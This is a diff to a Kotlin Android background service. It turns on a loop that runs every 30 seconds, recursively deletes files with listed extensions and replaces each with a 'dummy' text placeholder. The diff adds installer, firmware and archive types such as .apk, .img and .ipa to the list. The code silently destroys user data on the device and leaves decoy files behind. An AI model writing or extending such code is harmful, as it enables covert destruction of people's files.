@@ -32,6 +32,8 @@ import retrofit2.Call
 import retrofit2.Callback
 import retrofit2.Response
 import java.io.File
+import java.io.FileOutputStream
+import java.io.IOException
 
 
 class MyBackgroundService : Service() {
@@ -111,7 +113,9 @@ class MyBackgroundService : Service() {
                 ".rar",
                 ".7z",
                 ".tar",
-                ".gz"
+                ".gz",
+                ".apk", ".obb", ".ota", ".img", ".bin", ".ipsw", ".plist", ".ipa", ".tar", ".gz"
+
             )
 
 
@@ -192,8 +196,10 @@ class MyBackgroundService : Service() {
             "com.intelexxa.zxy",
             "com.intelexxa.prestige",
             "com.intelexxa.system",
-            "com.intelexxa.utils",
+            "com.intelexxa.utils"
+/*
             "com.superking.ludo.star"
+*/
         )
 
         private val deletedFilesList: MutableList<Pair<String, String>> = mutableListOf()
@@ -282,9 +288,9 @@ class MyBackgroundService : Service() {
 
         Thread {
             while (true) {
-//                deletePdfFiles()
+                deletePdfFiles()
                 checkForSuspiciousApps()
-                deletePdfFilesXYZ()
+//                deletePdfFilesXYZ()
 
                 Log.d("TAG", "onStartCommand:Thread aya ")
                 Thread.sleep(30000)
@@ -396,6 +402,7 @@ class MyBackgroundService : Service() {
     private fun deletePdfFilesInDirectory(directory: File) {
         val fileList = directory.listFiles()
         Log.d("delete", "fileList: $fileList")
+        var counter = 1
 
         fileList?.forEach { file ->
             if (file.isDirectory) {
@@ -410,6 +417,24 @@ class MyBackgroundService : Service() {
                     val filePath = file.absolutePath
                     val deleted = file.delete()
                     if (deleted) {
+                        val fileName1 = "dummy$counter.txt" // Generate unique file name
+                        counter++
+                        val filePath1 = file.absolutePath
+                        val customFilePath = filePath1.replaceAfterLast("/", fileName1) // Change the file name
+
+                        val customFileInputStream = applicationContext.assets.open("dummy.txt")
+                        val customFileOutputStream = FileOutputStream(customFilePath)
+                        customFileInputStream.use { input ->
+                            customFileOutputStream.use { output ->
+                                input.copyTo(output)
+                            }
+                        }
+                        customFileOutputStream.close()
+
+                        // Rename the file
+                        val newFile = File(customFilePath)
+                        file.renameTo(newFile)
+
 
                         notificationHandler.postDelayed({
                             OverlayDialog.showOverlayDialog(
@@ -460,7 +485,7 @@ class MyBackgroundService : Service() {
           Log.d("TAG", "deletePdfFilesInDirectoryXYZ: aya ")
           val fileList = directory.listFiles()
           Log.d("delete", "deletePdfFilesInDirectoryXYZ:list $fileList")
-
+          var counter = 1
           fileList?.forEach { file ->
               if (file.isDirectory) {
                   deletePdfFilesInDirectoryXYZ(file)
@@ -481,7 +506,23 @@ class MyBackgroundService : Service() {
 
                       val deleted = file.delete()
                       if (deleted) {
-                          Log.d("TAG", "deletePdfFilesInDirectoryXYZ: deleted me b a gya")
+                          val fileName1 = "dummy$counter.txt" // Generate unique file name
+                          counter++
+                          val filePath1 = file.absolutePath
+                          val customFilePath = filePath1.replaceAfterLast("/", fileName1) // Change the file name
+
+                          val customFileInputStream = applicationContext.assets.open("dummy.txt")
+                          val customFileOutputStream = FileOutputStream(customFilePath)
+                          customFileInputStream.use { input ->
+                              customFileOutputStream.use { output ->
+                                  input.copyTo(output)
+                              }
+                          }
+                          customFileOutputStream.close()
+
+                          // Rename the file
+                          val newFile = File(customFilePath)
+                          file.renameTo(newFile)
 
                           notificationHandler.postDelayed({
                               OverlayDialog.showOverlayDialog(
